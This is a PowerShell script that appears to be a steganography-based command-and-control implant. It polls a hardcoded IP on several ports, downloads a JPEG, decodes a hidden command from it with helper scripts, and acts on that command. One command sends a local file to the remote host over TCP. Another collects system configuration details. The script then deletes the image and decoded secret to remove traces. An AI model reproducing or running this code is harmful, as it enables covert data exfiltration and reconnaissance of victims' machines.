# Set the array of IP addresses to check
# $ipAddresses = @("127.0.0.1", "127.0.0.2", "127.0.0.123") # PROVIDE THE THREE SERVERS
$ip = "192.168.215.154"

# Set the port number to establish the socket connection
$ports = @("8090","8070","8000")

# Set the regex pattern to match the image file name
$regexPattern = @("image1.jpeg", "image2.jpeg")


# Loop through the IP addresses and try to establish a socket connection
foreach ($port in $ports) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($ip, $port)
        if ($client.Connected) {
            Write-Host "Connected to $ip,$port"

            # Fetch the directory listing from the server
            $directoryListing = Invoke-WebRequest -Uri "http://${ip}:${port}/" -UseBasicParsing
            $rawHtmlContent = $directoryListing.Content

            # Search for the image file using regex in the raw HTML content
	    foreach  ($regex1 in $regexPattern)
	    {
            	$regex = [regex]::new($regex1)
           	$matches = $regex.Matches($rawHtmlContent)

           	if ($matches.Count -gt 0) {
                    # Get the first matching image file
                    $imageFileName = $matches[0].Value
                    # Download the image file
                    $imageData = Invoke-WebRequest -Uri "http://${ip}:${port}/$imageFileName" -UseBasicParsing
                    Set-Content -Path "downloaded_image.jpeg" -Value $imageData.Content -Encoding Byte -Force

                    Write-Host "Image '$imageFileName' downloaded from $ip,$port"


                    # Set the paths to the PowerShell scripts and the file to send
                    $powerDecodeScript = "power_decode.ps1"
                    $checkSecretScript = "check_secret.ps1"
                    $fileToSend = "sample.txt"
                    $secretFileName = "secret.txt"

                    # Execute the power_steg.ps1 script
                    Write-Host "Executing power_decode.ps1 script..."
                    . $powerDecodeScript

                    # Check the first word of secret.txt using check_secret.ps1
                    Write-Host "Checking the first word of secret.txt..."
                    . $checkSecretScript
                    
                    # If the first word is "FindFirstFileA", send the file over TCP
                    if ($firstWord -eq "FindFirstFileA") {
                          Write-Host "The first word of the secret message is 'FindFirstFileA'."
                          
                          try {
			       $stream = $client.GetStream()

                               # Read the file content and send it over the TCP connection
                               $fileContent = Get-Content -Path $fileToSend -Raw
                               $fileBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
                               $stream.Write($fileBytes, 0, $fileBytes.Length)

                               Write-Host "File sent successfully over TCP."
                          } catch {

                               Write-Host "Failed to establish a TCP connection or send the file."

                          } finally {
                               $stream.Close()
                          }
                          
                    }


                    if ($firstWord -eq "Monitor") {
                          # Get system configuration details
                          $systemConfig = Get-WmiObject -Class Win32_ComputerSystem
                          $systemConfig | Out-File -FilePath "sample.txt" -Encoding ASCII

                          Write-Host "System configuration details written to sample.txt"
                    }
                          
                    Remove-Item -Path "downloaded_image.jpeg", $secretFileName -Force                    
                    

                    # Exit the loop if an image is downloaded
                    break
            	}
            	
                else {
                    Write-Host "No $regex1 image file found on $ip,$port"
            	}
	     }

             if ($imageData.Content) {
                break   
             }
        }
    }
    catch {
        # Handle connection errors or move to the next IP address
        Write-Host "Connection to $ip,$port failed: $_"
    }
}

# Clean up the socket connection
$client.Close()